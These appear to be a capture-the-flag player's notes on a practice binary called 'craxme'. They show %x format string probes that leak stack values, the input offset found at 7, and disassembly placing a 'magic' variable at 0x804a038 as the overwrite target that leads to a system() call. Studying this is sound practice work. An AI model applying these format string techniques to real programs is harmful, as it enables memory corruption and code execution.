"""
localhost@red:~/Desktop/binexp$ ./craxme 
Please crax me !
Give me magic :AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
AAAAffffcd5c.100.0.f7dd8438.93c.f7dd8cc8.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825
You need be a phd


localhost@red:~/Desktop/binexp$ ./craxme 
Please crax me !
Give me magic :AAAA%7$x
AAAA41414141
���You need be a phd

80485c6:       83 c4 10                add    esp,0x10
 80485c9:       a1 38 a0 04 08          mov    eax,ds:0x804a038
 80485ce:       3d da 00 00 00          cmp    eax,0xda
 80485d3:       75 12                   jne    80485e7 <main+0x9c>
 80485d5:       83 ec 0c                sub    esp,0xc
 80485d8:       68 e1 86 04 08          push   0x80486e1
 80485dd:       e8 2e fe ff ff          call   8048410 <system@plt>
 80485e2:       83 c4 10                add    esp,0x10
 80485e5:       eb 2e                   jmp    8048615 <main+0xca>
 80485e7:       a1 38 a0 04 08          mov    eax,ds:0x804a038
 80485ec:       3d 0c b0 ce fa          cmp    eax,0xfaceb00c
 80485f1:       75 12                   jne    8048605 <main+0xba>
 80485f3:       83 ec 0c                sub    esp,0xc

target addr = addr of magic = 0x804a038
"""
